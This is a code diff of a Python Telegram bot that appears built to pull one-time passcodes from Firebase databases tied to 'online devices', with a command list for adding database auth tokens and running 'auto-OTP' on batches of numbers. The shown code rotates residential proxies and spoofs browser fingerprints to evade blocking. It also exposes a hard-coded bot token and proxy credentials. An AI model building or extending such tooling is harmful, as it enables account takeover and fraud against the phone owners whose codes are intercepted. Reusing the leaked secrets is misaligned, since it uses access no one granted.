@@ -4,27 +4,16 @@
 ║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
 ║   + Proxy Pool (proxies.txt)                     ║
 ╚══════════════════════════════════════════════════╝
-
-Commands:
-  /addfire URL:AUTH       - Add single Firebase DB
-  /addfire (bulk paste)   - Add multiple Firebase DBs (one per line)
-  /removefire URL         - Remove a Firebase DB
-  /removefire all         - Remove all Firebase DBs
-  /listfire               - List all added Firebase DBs with status
-  /scan                   - Scan all DBs and show online devices
-  /auto [count]           - Start auto-OTP for N numbers (default 5)
-  /stopauto               - Stop running auto-OTP
-  /resetused              - Reset used numbers list
-  /status                 - Show bot status
-  /help                   - Show commands
-
-proxies.txt format (one per line):
-  host:port:username:password
-Example:
-  p1.arealproxy.com:9000:0463032f84441aa29e-type-residential-country-in:05a4af06-0e7d-47bf-b594-b9f4b57b579a
 """
 
 import requests
+from requests.exceptions import (
+    ProxyError as ReqProxyError,
+    ConnectTimeout as ReqConnectTimeout,
+    ReadTimeout as ReqReadTimeout,
+    ConnectionError as ReqConnectionError,
+    Timeout as ReqTimeout,
+)
 import json
 import base64
 import uuid
@@ -38,8 +27,11 @@ import random
 from io import BytesIO
 
 if sys.platform == "win32":
-    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
-    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+    try:
+        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+    except Exception:
+        pass
 
 # ============== CONFIG ==============
 BOT_TOKEN = "8800949076:AAHnyQb6YYbCs98KZyl7uhDfsv2jdHlgFEo"
@@ -70,7 +62,6 @@ def load_proxies():
             line = line.strip()
             if not line or line.startswith("#"):
                 continue
-            # Format: host:port:user:pass  (user may contain '-' / '.' but NOT ':')
             parts = line.split(":")
             if len(parts) == 4:
                 host, port, user, pwd = parts
@@ -83,18 +74,15 @@ def load_proxies():
                 loaded.append(f"http://{host}:{port}")
             else:
                 logger.warning(f"Skip malformed line {lineno}: {line[:60]}")
-    # de-duplicate while preserving pool size semantics
     with _proxy_lock:
         PROXY_POOL = loaded
     logger.info(f"Loaded {len(loaded)} proxies from proxies.txt")
 
 def get_proxy():
-    """Return a random healthy proxy URL, or None if pool is empty."""
     with _proxy_lock:
         pool = [p for p in PROXY_POOL if p not in _bad_proxies]
         if not pool:
             if PROXY_POOL:
-                # every proxy marked bad → clear bad list, give all another try
                 _bad_proxies.clear()
                 pool = list(PROXY_POOL)
             else:
@@ -139,7 +127,7 @@ UA_POOL = [
     ('Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1', '"Safari";v="18"', '"iOS"'),
     ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36', '"Google Chrome";v="131"', '"Windows"'),
 ]
-SCREEN_POOL = ['360x800','393x873','412x915','414x896','390x844','375x812','1920x1080']
+SCREEN_POOL = ['360x800', '393x873', '412x915', '414x896', '390x844', '375x812', '1920x1080']
 
 def get_fp():
     ua, ch, pl = random.choice(UA_POOL)
@@ -157,7 +145,6 @@ def get_fp():
 
 # ============== PROXIED SESSION ==============
 def get_sess():
-    """Return a requests.Session with a random proxy from the pool attached."""
     s = requests.Session()
     s.mount('https://', requests.adapters.HTTPAdapter(
         pool_connections=5, pool_maxsize=5, max_retries=1, pool_block=False))
@@ -168,7 +155,7 @@ def get_sess():
     return s
 
 def _is_proxy_error(e):
-    return isinstance(e, (requests.ProxyError, requests.ConnectTimeout, requests.ConnectionError))
+    return isinstance(e, (ReqProxyError, ReqConnectTimeout, ReqConnectionError))
 
 def _should_kill_proxy(status):
     return status in (403, 407, 429, 502, 503, 504)
@@ -549,7 +536,6 @@ def auto_worker(cid, count):
                           f"<i>◌ Fetching name...</i>")
         mid = m.get('result', {}).get('message_id')
 
-        # Name lookup (proxied)
         name = "MR"
         s = None
         try:
